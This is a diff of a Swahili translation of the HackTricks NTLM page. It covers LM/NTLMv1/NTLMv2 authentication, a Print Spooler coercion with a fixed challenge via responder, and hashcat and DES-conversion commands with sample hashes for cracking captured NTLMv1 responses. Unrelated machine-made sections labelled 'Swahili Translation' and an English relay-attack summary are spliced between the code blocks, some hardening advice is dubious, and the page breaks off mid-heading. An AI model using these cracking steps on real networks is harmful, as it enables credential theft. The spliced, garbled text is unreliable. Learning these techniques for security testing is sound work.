@@ -1,56 +1,51 @@
 # NTLM
 
-## NTLM
-
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-### Taarifa Msingi
+## Taarifa Msingi
 
-Katika mazingira ambapo **Windows XP na Server 2003** yanatumika, hash za LM (Lan Manager) hutumiwa, ingawa inatambulika sana kuwa zinaweza kudukuliwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haikutumika, ikionyesha hash kwa neno tupu.
+Katika mazingira ambapo **Windows XP na Server 2003** zinatumika, hash za LM (Lan Manager) hutumiwa, ingawa inatambulika kwa kiasi kikubwa kwamba zinaweza kudukuliwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haijatumika, ikionyesha hash kwa herufi tupu.
 
-Kwa chaguo-msingi, itifaki ya uwakilishi wa **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) inachukua nafasi katika hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa kikoa, kushindwa kwa Kerberos kutokana na usanidi usio sahihi, au wakati uhusiano unajaribiwa kutumia anwani ya IP badala ya jina la mwenyeji halali.
+Kwa chaguo-msingi, itifaki ya uwthibitishaji ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) huingilia kati chini ya hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa uwanja, kushindwa kwa Kerberos kutokana na usanidi usio sahihi, au wakati mawasiliano yanajaribiwa kutumia anwani ya IP badala ya jina la mwenyeji halali.
 
-Kuwepo kwa kichwa cha **"NTLMSSP"** katika pakiti za mtandao kunamaanisha mchakato wa uwakilishi wa NTLM.
+Kuwepo kwa kichwa cha **"NTLMSSP"** katika pakiti za mtandao hufanya ishara ya mchakato wa uwthibitishaji wa NTLM.
 
-Msaada kwa itifaki za uwakilishi - LM, NTLMv1, na NTLMv2 - unawezeshwa na DLL maalum iliyo katika `%windir%\Windows\System32\msv1\_0.dll`.
+Msaada kwa itifaki za uwthibitishaji - LM, NTLMv1, na NTLMv2 - unawezeshwa na DLL maalum iliyoko katika `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Muhimu**:
+**Mambo Muhimu**:
 
-* Hash za LM ni hafifu na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) inaonyesha kutokuwepo kwake.
-* Kerberos ndiyo njia ya uwakilishi ya chaguo-msingi, na NTLM hutumiwa tu katika hali fulani.
-* Pakiti za uwakilishi wa NTLM zinaweza kutambuliwa kwa kichwa cha "NTLMSSP".
+* Hash za LM ni dhaifu na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) inaonyesha kutofautiana kwake.
+* Kerberos ni njia ya msingi ya uwthibitishaji, na NTLM hutumiwa tu chini ya hali fulani.
+* Pakiti za uwthibitishaji wa NTLM zinaweza kutambulika kwa kichwa cha "NTLMSSP".
 * Itifaki za LM, NTLMv1, na NTLMv2 zinasaidiwa na faili ya mfumo `msv1\_0.dll`.
 
-### LM, NTLMv1 na NTLMv2
+## LM, NTLMv1 na NTLMv2
 
-Unaweza kuangalia na kusanidi itifaki gani itatumika:
+Unaweza kuangalia na kurekebisha itifaki itakayotumiwa:
 
-#### GUI
+### GUI
 
-Tekeleza _secpol.msc_ -> Sera za ndani -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uwakilishi wa LAN Manager. Kuna viwango 6 (kutoka 0 hadi 5).
+Tekeleza _secpol.msc_ -> Sera za Lokali -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uwthibitishaji wa LAN Manager. Kuna viwango 6 (kutoka 0 hadi 5).
 
-![](<../../.gitbook/assets/image (92).png>)
+![](<../../.gitbook/assets/image (916).png>)
 
-#### Usajili
+### Usajili
 
 Hii itaweka kiwango cha 5:
-
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-
-Inawezekana kuwa na thamani zifuatazo:
-
+Thamani zinazowezekana:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -59,90 +54,68 @@ Inawezekana kuwa na thamani zifuatazo:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+## Mpangilio wa msingi wa uthibitishaji wa Domain wa NTLM
 
-### Mpangilio wa msingi wa uthibitishaji wa NTLM wa Domain
+1. **Mtumiaji** anaingiza **mikopo yake**
+2. Mashine ya mteja **inatuma ombi la uthibitishaji** likituma **jina la uwanja** na **jina la mtumiaji**
+3. **Server** inatuma **changamoto**
+4. **Mteja anachafua** **changamoto** kwa kutumia hash ya nenosiri kama ufunguo na kuituma kama jibu
+5. **Server inatuma** kwa **Msimamizi wa Domain** jina la **uwanja, jina la mtumiaji, changamoto na jibu**. Ikiwa **Hakuna** Directory ya Active iliyowekwa au jina la uwanja ni jina la server, mikopo inaangaliwa **kitaaluma**.
+6. **Msimamizi wa Domain anathibitisha kila kitu** na kutuma habari kwa server
 
-1. **Mtumiaji** anaingiza **vitambulisho** vyake
-2. Mashine ya mteja inatuma ombi la uthibitishaji likituma **jina la kikoa** na **jina la mtumiaji**
-3. **Seva** inatuma **changamoto**
-4. Mteja anaficha **changamoto** kwa kutumia hash ya nenosiri kama ufunguo na kuituma kama jibu
-5. **Seva inatuma** kwa **Mfumo wa Udhibiti wa Kikoa** jina la kikoa, jina la mtumiaji, changamoto, na jibu. Ikiwa hakuna Mwongozo wa Shughuli uliowekwa au jina la kikoa ni jina la seva, vitambulisho vinakaguliwa **kwa kiwango cha ndani**.
-6. **Mfumo wa Udhibiti wa Kikoa** unakagua ikiwa kila kitu ni sahihi na kutuma habari kwa seva
+**Server** na **Msimamizi wa Domain** wanaweza kuunda **Channel Salama** kupitia **Netlogon** server kwani Msimamizi wa Domain anajua nenosiri la server (ipo ndani ya db ya **NTDS.DIT**).
 
-**Seva** na **Mfumo wa Udhibiti wa Kikoa** wanaweza kuunda **Channel Salama** kupitia seva ya **Netlogon** kwani Mfumo wa Udhibiti wa Kikoa anajua nenosiri la seva (lipo ndani ya db ya **NTDS.DIT**).
+### Mpangilio wa uthibitishaji wa NTLM wa ndani
 
-#### Mpangilio wa uthibitishaji wa NTLM wa ndani
+Uthibitishaji ni kama ule uliotajwa **hapo awali lakini** **server** anajua **hash ya mtumiaji** anayejaribu kuthibitisha ndani ya faili ya **SAM**. Kwa hivyo, badala ya kuuliza Msimamizi wa Domain, **server itajithibitisha yenyewe** ikiwa mtumiaji anaweza kuthibitisha.
 
-Uthibitishaji ni kama ule uliotajwa **hapo awali lakini** **seva** inajua **hash ya mtumiaji** anayejaribu kuthibitisha ndani ya faili ya **SAM**. Kwa hivyo, badala ya kuuliza Mfumo wa Udhibiti wa Kikoa, **seva itajikagua yenyewe** ikiwa mtumiaji anaweza kuthibitisha.
+### Changamoto ya NTLMv1
 
-#### Changamoto ya NTLMv1
+**Urefu wa changamoto ni 8 baiti** na **jibu ni mrefu wa baiti 24**.
 
-Urefu wa **changamoto ni herufi 8** na **jibu ni urefu wa herufi 24**.
-
-**Hash NT (herufi 16)** imegawanywa katika **sehemu 3 za herufi 7 kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho imejazwa na sifuri**. Kisha, **changamoto** inafichwa tofauti na kila sehemu na **herufi zilizofichwa** zinajumuishwa. Jumla: 8B + 8B + 8B = 24 Herufi.
+**Hash NT (16baiti)** imegawanywa katika **sehemu 3 za 7baiti kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho imejazwa na sifuri**. Kisha, **changamoto** inachifriwa kwa kila sehemu na **baiti zilizochifriwa zinajumuishwa**. Jumla: 8B + 8B + 8B = 24Baiti.
 
 **Matatizo**:
 
 * Ukosefu wa **ubunifu**
 * Sehemu 3 zinaweza **kushambuliwa kwa kujitegemea** ili kupata hash ya NT
 * **DES inaweza kuvunjwa**
-* Ufunguo wa 3º unajumuisha **sifuri tano**.
-* Kwa kutumia **changamoto ile ile**, **jibu** litakuwa **sawa**. Kwa hivyo, unaweza kumpa mhanga herufi "**1122334455667788**" kama **changamoto** na kushambulia jibu lililotumiwa kwa kutumia **meza za upinde zilizopangwa mapema**.
+* Ufunguo wa 3 ni daima unajumuisha **sifuri 5**.
+* Kwa kutolewa **changamoto ile ile** jibu litakuwa **lile lile**. Kwa hivyo, unaweza kumpa mhanga **changamoto** ya herufi "**1122334455667788**" na kushambulia jibu lililotumika **kwa kutumia meza za mvua zilizopangwa mapema**.
 
-#### Shambulio la NTLMv1
+### Shambulio la NTLMv1
 
-Siku hizi ni nadra kupata mazingira yaliyowekwa kwa Unconstrained Delegation, lakini hii haimaanishi kuwa huwezi **kutumia huduma ya Print Spooler** iliyowekwa.
+Siku hizi ni nadra kupata mazingira yaliyo na Unconstrained Delegation iliyowekwa, lakini hii haimaanishi huwezi **kutumia vibaya huduma ya Print Spooler** iliyowekwa.
 
-Unaweza kutumia vibali/vikao fulani ulivyonavyo kwenye AD kuomba **printa kuthibitisha** dhidi ya **mwenyeji chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kuweka changamoto ya uthibitishaji kuwa 1122334455667788**, kukamata jaribio la uthibitishaji, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **kulivunja**.\
-Ikiwa unatumia `responder` unaweza kujaribu **kutumia bendera `--lm`** kujaribu **kudhibiti** **uthibitishaji**.\
-_Tafadhali kumbuka kuwa kwa mbinu hii uthibitishaji lazima ufanyike kwa kutumia NTLMv1 (NTLMv2 sio halali)._
+Unaweza kutumia baadhi ya mikopo/malipo uliyonayo tayari kwenye AD kuomba **printer kuthibitisha** dhidi ya **mwenyeji chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kuweka changamoto ya uthibitishaji kuwa 1122334455667788**, kukamata jaribio la uthibitishaji, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **kuvunja**.\
+Ikiwa unatumia `responder` unaweza kujaribu \*\*kutumia bendera `--lm` \*\* kujaribu **kudhoofisha** **uthibitishaji**.\
+_Tafadhali kumbuka kwamba kwa mbinu hii uthibitishaji lazima ufanyike kwa kutumia NTLMv1 (NTLMv2 sio halali)._
 
-Kumbuka kuwa printa itatumia akaunti ya kompyuta wakati wa uthibitishaji, na akaunti za kompyuta hutumia **nenosiri ndefu na la kubahatisha** ambalo **labda hautaweza kulivunja** kwa kutumia **kamusi za kawaida**. Lakini uthibitishaji wa **NTLMv1** hutumia DES ([taarifa zaidi hapa](./#ntlmv1-challenge)), kwa hivyo kwa kutumia huduma fulani zilizotengwa maalum kwa kuvunja DES utaweza kulivunja (unaweza kutumia [https://crack.sh/](https://crack.sh) kwa mfano).
+Kumbuka kwamba printer itatumia akaunti ya kompyuta wakati wa uthibitishaji, na akaunti za kompyuta hutumia **manenosiri marefu na ya kubahatisha** ambayo labda **hutaweza kuvunja** kwa kutumia **kamusi za kawaida**. Lakini uthibitishaji wa **NTLMv1** **unatumia DES** ([maelezo zaidi hapa](./#ntlmv1-challenge)), kwa hivyo kutumia huduma fulani zilizotengwa kwa kuvunja DES utaweza kuvunja (unaweza kutumia [https://crack.sh/](https://crack.sh) kwa mfano).
 
-#### Shambulio la NTLMv1 na hashcat
+### Shambulio la NTLMv1 kwa hashcat
 
-NTLMv1 pia inaweza kuvunjwa na Chombo cha NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambacho hutoa muundo wa ujumbe wa NTLMv1 ambao unaweza kuvunjwa na hashcat.
+NTLMv1 pia inaweza kuvunjwa na NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambayo inaunda ujumbe wa NTLMv1 kwa njia ambayo inaweza kuvunjwa na hashcat.
 
-Amri ya
-
+Amri
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
+### Swahili Translation:
 
-## NTLM
+#### Kufunga NTLM
 
-NTLM (NT LAN Manager) ni itifaki ya uwakilishi wa kitambulisho inayotumiwa katika mifumo ya Windows. Inatumika kwa kusudi la uwakilishi wa kitambulisho na uthibitishaji wa watumiaji katika mazingira ya mtandao.
+Kufunga NTLM inaweza kufanywa kwa kufuata hatua hizi:
 
-### Utangulizi
+1. **Zima NTLM kwenye Kikoa**: Hakikisha kuwa sera za kikoa zimeboreshwa ili kuzuia matumizi ya NTLM popote panapowezekana.
+   
+2. **Badilisha Mipangilio ya Usalama wa Mitandao**: Weka mipangilio ya usalama wa mitandao kuzuia matumizi ya NTLM na badilisha kuwa njia zingine za uwakilishi zinatumika badala yake.
 
-NTLM inafanya kazi kwa kutumia hatua tatu za msingi:
+3. **Tumia Itifaki Zingine**: Badilisha kutoka NTLM kwenda kwa itifaki zingine kama vile Kerberos ambazo ni salama zaidi.
 
-1. Utambulisho wa awali: Mteja hutuma ombi la utambulisho kwa seva.
-2. Utambulisho wa kati: Seva hutuma changamoto kwa mteja, ambayo inajumuisha kamba ya nasibu.
-3. Utambulisho wa mwisho: Mteja hutuma jibu lenye kamba ya nasibu iliyohifadhiwa kwenye kompyuta yake.
+4. **Fuatilia Matumizi ya NTLM**: Tumia zana za ufuatiliaji kufuatilia matumizi ya NTLM kwenye mifumo yako na kuchukua hatua stahiki kwa matumizi yasiyoruhusiwa.
 
-### Ukiukaji wa NTLM
-
-Kuna njia kadhaa za kukiuka usalama wa NTLM, ikiwa ni pamoja na:
-
-* **Pass-the-Hash**: Mbinu ambapo mshambuliaji hutumia hash ya nenosiri badala ya nenosiri lenyewe kwa kuingia kwenye mfumo.
-* **Pass-the-Ticket**: Mshambuliaji hutumia tiketi ya uthibitisho iliyopatikana kutoka kwa mteja mwingine kuingia kwenye mfumo.
-* **Overpass-the-Hash**: Mshambuliaji hutumia hash ya nenosiri iliyopatikana kutoka kwa mteja mwingine kufanya vitendo vya usimamizi kwenye mfumo.
-* **Reflection**: Mshambuliaji hutumia mbinu ya kurejea ili kudanganya mteja kutoa hash ya nenosiri.
-
-### Kuzuia NTLM
-
-Kuna hatua kadhaa za kuchukua ili kuzuia ukiukaji wa NTLM:
-
-1. **Kuondoa msaada wa NTLM**: Funga msaada wa NTLM kwenye seva na vifaa vingine vya mtandao.
-2. **Tumia itifaki zinazofaa**: Badilisha kutoka NTLM kwenda itifaki zingine zinazofaa kama vile Kerberos.
-3. **Tumia sera kali za nenosiri**: Weka sera kali za nenosiri ili kuhakikisha kuwa nenosiri ni ngumu na linabadilishwa mara kwa mara.
-4. **Tumia ufungaji wa kikoa**: Tumia ufungaji wa kikoa ili kudhibiti ufikiaji na kusimamia kitambulisho cha watumiaji.
-
-### Marejeo
-
-* [https://en.wikipedia.org/wiki/NT\_LAN\_Manager](https://en.wikipedia.org/wiki/NT\_LAN\_Manager)
-
+Kufunga NTLM ni hatua muhimu katika kuimarisha usalama wa mifumo yako ya Windows. Kwa kufuata hatua hizi, unaweza kupunguza hatari za usalama zinazotokana na matumizi ya NTLM.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -168,35 +141,36 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
+# NTLM Relay Attack
 
-## HATUA YA KUANZA
+## Introduction
 
-Ili kuanza kufanya kazi na NTLM, unahitaji kufuata hatua zifuatazo:
+NTLM relay attacks are a common technique used by hackers to exploit the NTLM authentication protocol. This attack involves intercepting the NTLM authentication traffic between a client and a server, and then relaying it to another server to gain unauthorized access.
 
-1. **Kutambua Lengo**: Anza kwa kutambua mfumo unaotaka kushambulia na kuelewa jinsi NTLM inavyotumiwa katika mazingira hayo.
-2. **Kukusanya Habari**: Jifunze kuhusu mazingira ya lengo lako, ikiwa ni pamoja na aina ya NTLM inayotumiwa, mipangilio ya usalama, na maelezo mengine muhimu.
-3. **Kutambua Mbinu za Shambulio**: Elewa mbinu za kawaida za shambulio zinazohusiana na NTLM, kama vile Pass-the-Hash, Pass-the-Ticket, na NTLM Relay.
-4. **Kukusanya Nyenzo za Shambulio**: Pata zana na rasilimali zinazohitajika kutekeleza mbinu za shambulio za NTLM.
-5. **Kutekeleza Shambulio**: Fanya shambulio kwa kutumia mbinu zilizopatikana na nyenzo zilizokusanywa hapo awali.
-6. **Kupima Mafanikio**: Angalia ikiwa shambulio lako limefanikiwa na ikiwa unaweza kupata ufikiaji usiohalali kwenye mfumo wa lengo.
-7. **Kuchukua Hatua za Kukinga**: Tumia hatua za kuzuia ili kuzuia shambulio la NTLM na kuimarisha usalama wa mfumo wako.
-8. **Kujifunza na Kuboresha**: Endelea kujifunza na kuboresha ujuzi wako wa NTLM na mbinu zinazohusiana na shambulio.
+## How it works
 
-Kwa kufuata hatua hizi, utakuwa na uwezo wa kufanya kazi na NTLM na kutekeleza mbinu za shambulio kwa ufanisi. Kumbuka kuwa matumizi ya NTLM kwa madhumuni ya shambulio yanapaswa kufanywa tu kwa idhini ya kisheria na kwa madhumuni ya kujifunza na kuboresha usalama wa mifumo yako.
+1. The attacker intercepts the NTLM authentication request from the client.
+2. The attacker relays the request to a different server.
+3. The different server accepts the request, thinking it is coming from the original client.
+4. The attacker gains unauthorized access to the different server using the intercepted credentials.
 
+## Mitigation
+
+To prevent NTLM relay attacks, it is recommended to:
+- Enable SMB signing to prevent tampering with authentication traffic.
+- Implement Extended Protection for Authentication to protect against relay attacks.
+- Disable NTLM authentication in favor of more secure protocols like Kerberos.
+
+By following these mitigation techniques, organizations can significantly reduce the risk of falling victim to NTLM relay attacks.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-
-Chalaza hashcat (ugawanyaji bora ni kupitia kifaa kama hashtopolis) kwani itachukua siku kadhaa vinginevyo.
-
+Chalula hashcat (usambazaji ni bora kupitia chombo kama hashtopolis) kwani hii itachukua siku kadhaa vinginevyo.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-
-Katika kesi hii tunajua kuwa nenosiri ni password hivyo tutafanya udanganyifu kwa madhumuni ya demo:
-
+Katika kesi hii tunajua nywila ya hii ni nywila kwa hivyo tutacheza kwa madhumuni ya demo:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -205,9 +179,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-
-Sasa tunahitaji kutumia zana za hashcat-utilities ili kubadilisha funguo za des zilizovunjwa kuwa sehemu za hash ya NTLM:
-
+Sasa tunahitaji kutumia zana za hashcat-utilities kubadilisha funguo zilizovunjika za des kuwa sehemu za hash ya NTLM:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -215,220 +187,127 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-
-Hatua ya mwisho ni kuhakikisha kuwa sera za kikoa zimeimarishwa kwa usalama wa NTLM. Hapa kuna hatua kadhaa unazoweza kuchukua:
-
-1. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Incoming NTLM Traffic" kwa kuiweka kuwa "Deny All" au "Deny All Accounts". Hii itazuia trafiki ya NTLM kuingia kwenye mtandao wako.
-2. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Outgoing NTLM Traffic to Remote Servers" kwa kuiweka kuwa "Deny All" au "Deny All Accounts". Hii itazuia trafiki ya NTLM kutoka kwa watumiaji wako kwenda kwenye seva za mbali.
-3. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Incoming NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayoingia kwenye mtandao wako.
-4. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Outgoing NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayotoka kwa watumiaji wako.
-5. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Incoming NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayoingia kwenye mtandao wako.
-6. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Outgoing NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayotoka kwa watumiaji wako.
-7. Hakikisha kuwa sera hizi zimeenea kwa vikoa vyote katika mfumo wako wa uendeshaji.
-
-Kwa kufuata hatua hizi, utaimarisha usalama wa NTLM kwenye mfumo wako wa uendeshaji na kupunguza hatari ya mashambulizi yanayohusiana na NTLM.
-
+Hatimaye sehemu ya mwisho:
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
+### Swahili Translation
 
-## NTLM
+## Kufunga NTLM
 
-NTLM (NT LAN Manager) ni itifaki ya uwakilishi wa kitambulisho inayotumiwa katika mifumo ya Windows kwa madhumuni ya uwakilishi wa kitambulisho na uthibitishaji. Itifaki hii hutumiwa sana katika mazingira ya mitandao ya ndani ya Windows.
+Kufunga NTLM kunaweza kufanywa kwa kufuata hatua zifuatazo:
 
-### Utangulizi
+1. **Lemaza NTLM kwenye Wavuti ya Windows**  
+   Lemaza NTLM kwenye mipangilio ya kikoa kuzuia matumizi yake.
 
-NTLM inatumia mbinu ya kuchakata nyuma (challenge-response) kwa uthibitishaji wa watumiaji. Mchakato huu unajumuisha hatua tatu:
+2. **Tumia Itifaki Zilizoboreshwa**  
+   Badilisha kutumia itifaki zilizoboreshwa kama vile Kerberos.
 
-1. **Uthibitishaji wa awali (Negotiation)**: Mteja na seva hufanya mazungumzo ya awali ili kubadilishana maelezo ya uthibitishaji na kuanzisha mazingira ya uthibitishaji.
-2. **Uthibitishaji wa changamoto (Challenge-Response)**: Seva hutuma changamoto kwa mteja, ambayo mteja hujibu kwa kutumia hash ya nenosiri lake.
-3. **Uthibitishaji wa mwisho (Session Security)**: Mara baada ya mteja kuthibitishwa, seva na mteja huanzisha kikao salama cha mawasiliano.
+3. **Tumia Cheti cha SSL/TLS**  
+   Tumia cheti cha SSL/TLS kati ya seva na wateja kwa usalama zaidi.
 
-### Mashambulizi ya NTLM
+4. **Tumia Mchanganyiko wa Itifaki**  
+   Tumia mchanganyiko wa itifaki kama vile NTLM na Kerberos kwa usalama bora.
 
-NTLM ina hatari kadhaa za usalama ambazo zinaweza kuch exploited na wadukuzi. Baadhi ya mashambulizi maarufu ni pamoja na:
-
-* **Pass-the-Hash**: Mshambuliaji anaweza kutumia hash ya nenosiri la mtumiaji iliyopatikana hapo awali kuingia kwenye mfumo.
-* **Pass-the-Ticket**: Mshambuliaji anaweza kutumia tiketi ya uthibitishaji iliyopatikana hapo awali kuingia kwenye mfumo.
-* **Relay Attack**: Mshambuliaji anaweza kuchukua maelezo ya uthibitishaji kutoka kwa mteja na kuyatumia kuingia kwenye seva nyingine.
-
-### Kuhifadhi NTLM
-
-Kwa sababu ya hatari za usalama zinazohusiana na NTLM, ni muhimu kuchukua hatua za kuhifadhi ili kuzuia mashambulizi. Hatua za kuhifadhi zinaweza kujumuisha:
-
-* **Kuondoa NTLM**: Kuzima kabisa matumizi ya NTLM kwenye mifumo yako.
-* **Kuwezesha SMB Signing**: Kuhakikisha kuwa mawasiliano ya SMB yanasainiwa ili kuzuia mashambulizi ya kati.
-* **Kuwezesha LDAP Signing**: Kuhakikisha kuwa mawasiliano ya LDAP yanasainiwa ili kuzuia mashambulizi ya kati.
-* **Kuwezesha Extended Protection for Authentication**: Kuhakikisha kuwa mawasiliano ya NTLM yanalindwa na ulinzi wa ziada.
-
-### Hitimisho
-
-Kuelewa NTLM na hatari zake za usalama ni muhimu kwa wataalamu wa usalama wa mifumo ya Windows. Kwa kuchukua hatua za kuhifadhi zinazofaa, tunaweza kuzuia mashambulizi yanayotokana na NTLM na kudumisha usalama wa mifumo yetu.
-
+Kufuata hatua hizi kutafanya mifumo yako iwe ngumu zaidi kwa wadukuzi kuvunja.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
+### Changamoto ya NTLMv2
 
-#### NTLMv2 Challenge
+**Urefu wa changamoto ni herufi 8** na **majibu 2 hutumwa**: Moja ni **urefu wa herufi 24** na urefu wa **lingine** ni **tofauti**.
 
-**Urefu wa changamoto ni herufi 8** na **majibu 2 yanatumwa**: Moja ni urefu wa **herufi 24** na urefu wa **lingine** ni **kubadilika**.
+**Jibu la kwanza** hujengwa kwa kuchifra kutumia **HMAC\_MD5** **neno** lililoundwa na **mteja na uwanja** na kutumia kama **funguo** **hash MD4** ya **hash ya NT**. Kisha, **matokeo** yatatumiwa kama **funguo** kuchifra kutumia **HMAC\_MD5** **changamoto**. Kwa hili, **changamoto ya mteja ya herufi 8 itaongezwa**. Jumla: 24 B.
 
-**Jibu la kwanza** linatengenezwa kwa kuchifra kwa kutumia **HMAC\_MD5** **herufi** iliyoundwa na **mteja na kikoa** na kutumia kama **funguo** **hash MD4** ya **hash NT**. Kisha, **matokeo** yatatumiwa kama **funguo** kuchifra kwa kutumia **HMAC\_MD5** **changamoto**. Kwa hili, **changamoto ya mteja ya herufi 8 itaongezwa**. Jumla: 24 B.
+**Jibu la pili** hujengwa kwa kutumia **thamani kadhaa** (changamoto mpya ya mteja, **muda** ili kuepuka **mashambulizi ya kurudia...**)
 
-**Jibu la pili** linatengenezwa kwa kutumia **thamani kadhaa** (changamoto mpya ya mteja, **muda** ili kuepuka **mashambulizi ya kurudia**...)
+Ikiwa una **pcap ambayo imekamata mchakato wa uthibitisho uliofanikiwa**, unaweza kufuata mwongozo huu kupata uwanja, jina la mtumiaji, changamoto na jibu na kujaribu kuvunja nenosiri: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
-Ikiwa una **pcap ambayo imekamata mchakato wa uwakilishi wa uthibitishaji uliofanikiwa**, unaweza kufuata mwongozo huu kupata kikoa, jina la mtumiaji, changamoto na jibu na jaribu kuvunja nywila: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+## Pita-Hash
 
-### Pita Hash
